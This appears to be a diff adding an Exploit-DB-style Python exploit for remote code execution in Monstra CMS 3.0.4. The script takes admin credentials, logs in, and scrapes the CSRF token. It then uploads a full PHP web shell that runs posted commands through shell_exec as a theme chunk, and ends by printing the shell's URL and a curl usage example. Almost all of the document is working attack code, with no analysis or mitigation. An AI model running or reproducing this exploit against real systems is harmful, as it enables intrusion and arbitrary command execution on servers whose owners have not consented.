@@ -1,0 +1,174 @@
+# Exploit Title: Monstra CMS 3.0.4 - Remote Code Execution (RCE)
+# Date: 05.05.2024
+# Exploit Author: Ahmet Ümit BAYRAM
+# Fixed: Indent, regex, custom POST webshell payload
+# Vendor Homepage: https://monstra.org/
+# Software Link: https://monstra.org/monstra-3.0.4.zip
+# Version: 3.0.4
+# Tested on: Kali Linux / Python3
+import requests
+import random
+import string
+import time
+import re
+import sys
+
+requests.packages.urllib3.disable_warnings()
+
+if len(sys.argv) < 4:
+    print("Usage: python3 52038.py <url> <username> <password>")
+    sys.exit(1)
+
+base_url = sys.argv[1].rstrip("/")
+username = sys.argv[2]
+password = sys.argv[3]
+
+session = requests.Session()
+login_url = f'{base_url}/admin/index.php?id=dashboard'
+login_data = {
+    'login': username,
+    'password': password,
+    'login_submit': 'Log In'
+}
+
+filename = ''.join(random.choices(string.ascii_lowercase + string.digits, k=5))
+print("[*] Logging in...")
+
+try:
+    response = session.post(login_url, data=login_data, verify=False, timeout=10)
+except Exception as e:
+    print(f"[!] Connect error: {e}")
+    sys.exit(1)
+
+if 'Dashboard' in response.text:
+    print("[+] Login successful")
+else:
+    print("[-] Login failed, check credentials/url")
+    sys.exit(1)
+
+time.sleep(2)
+edit_url = f'{base_url}/admin/index.php?id=themes&action=add_chunk'
+
+try:
+    response = session.get(edit_url, verify=False, timeout=10)
+except Exception as e:
+    print(f"[!] Get add_chunk page error: {e}")
+    sys.exit(1)
+
+token_search = re.search(r'input type="hidden" id="csrf" name="csrf" value="(.*?)"', response.text)
+if token_search:
+    token = token_search.group(1)
+    print(f"[*] Got CSRF token: {token}")
+else:
+    print("[-] CSRF token could not be found. Maybe login invalid / page changed")
+    sys.exit(1)
+
+content = '''<?php
+if (!empty($_POST['cmd'])) {
+    $cmd = shell_exec($_POST['cmd']);
+}
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Web Shell</title>
+    <style>
+        * {
+            -webkit-box-sizing: border-box;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: sans-serif;
+            color: rgba(0, 0, 0, .75);
+        }
+        main {
+            margin: auto;
+            max-width: 850px;
+        }
+        pre,
+        input,
+        button {
+            padding: 10px;
+            border-radius: 5px;
+            background-color: #efefef;
+        }
+        label {
+            display: block;
+        }
+        input {
+            width: 100%;
+            background-color: #efefef;
+            border: 2px solid transparent;
+        }
+        input:focus {
+            outline: none;
+            background: transparent;
+            border: 2px solid #e6e6e6;
+        }
+        button {
+            border: none;
+            cursor: pointer;
+            margin-left: 5px;
+        }
+        button:hover {
+            background-color: #e6e6e6;
+        }
+        .form-group {
+            display: -webkit-box;
+            display: -ms-flexbox;
+            display: flex;
+            padding: 15px 0;
+        }
+    </style>
+</head>
+<body>
+    <main>
+        <h1>Web Shell</h1>
+        <h2>Execute a command</h2>
+        <form method="post">
+            <label for="cmd"><strong>Command</strong></label>
+            <div class="form-group">
+                <input type="text" name="cmd" id="cmd" value="<?= htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8') ?>"
+                       onfocus="this.setSelectionRange(this.value.length, this.value.length);" autofocus required>
+                <button type="submit">Execute</button>
+            </div>
+        </form>
+        <?php if ($_SERVER['REQUEST_METHOD'] === 'POST'): ?>
+            <h2>Output</h2>
+            <?php if (isset($cmd)): ?>
+                <pre><?= htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8') ?></pre>
+            <?php else: ?>
+                <pre><small>No result.</small></pre>
+            <?php endif; ?>
+        <?php endif; ?>
+    </main>
+</body>
+</html>'''
+
+edit_data = {
+    'csrf': token,
+    'name': filename,
+    'content': content,
+    'add_file': 'Save'
+}
+
+print("[*] Preparing shell chunk...")
+try:
+    response = session.post(edit_url, data=edit_data, verify=False, timeout=10)
+except Exception as e:
+    print(f"[!] Post add_chunk error {e}")
+    sys.exit(1)
+
+time.sleep(2)
+shell_path = f"{base_url}/public/themes/default/{filename}.chunk.php"
+
+if response.status_code == 200:
+    print(f"[+] Your shell is ready: {shell_path}")
+    print("[*] Usage: POST parameter cmd for command execution")
+    print(f"[*] Example curl: curl -X POST -d 'cmd=id' {shell_path}")
+else:
+    print("[-] Failed to create chunk shell.")
+    print(f"[-] Status code: {response.status_code}")
